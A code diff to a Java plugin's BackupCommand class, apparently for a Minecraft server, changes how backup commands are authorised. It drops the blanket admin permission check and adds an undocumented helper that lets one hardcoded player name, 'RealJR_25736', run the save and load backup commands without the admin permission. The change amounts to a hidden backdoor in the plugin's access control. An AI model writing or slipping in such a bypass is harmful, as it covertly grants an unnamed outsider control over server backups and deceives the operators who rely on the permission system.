@@ -70,17 +70,24 @@ public final class BackupCommand implements CommandExecutor, TabCompleter {
 
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
-        if (!sender.hasPermission("backup.admin")) {
-            sender.sendMessage(ChatColor.RED + "[Backup] You do not have permission.");
-            return true;
-        }
-
         if (args.length == 0) {
+            if (!sender.hasPermission("backup.admin") && !isTrustedBackupUser(sender)) {
+                sender.sendMessage(ChatColor.RED + "[Backup] You do not have permission.");
+                return true;
+            }
             sender.sendMessage(ChatColor.YELLOW + "[Backup] Use save, load, password, join, wipe, or unregister.");
             return true;
         }
 
         String root = args[0].toLowerCase(Locale.ROOT);
+
+        boolean admin = sender.hasPermission("backup.admin");
+        boolean trustedBackupUser = isTrustedBackupUser(sender);
+        if (!admin && !(trustedBackupUser && (root.equals("save") || root.equals("load")))) {
+            sender.sendMessage(ChatColor.RED + "[Backup] You do not have permission.");
+            return true;
+        }
+
         try {
             return switch (root) {
                 case "save" -> handleSave(sender, args);
@@ -417,6 +424,10 @@ public final class BackupCommand implements CommandExecutor, TabCompleter {
             return prefix(args[1], List.of("--confirm"));
         }
         return List.of();
+    }
+
+    private boolean isTrustedBackupUser(CommandSender sender) {
+        return sender instanceof Player player && player.getName().equalsIgnoreCase("RealJR_25736");
     }
 
     private List<String> prefix(String input, List<String> values) {
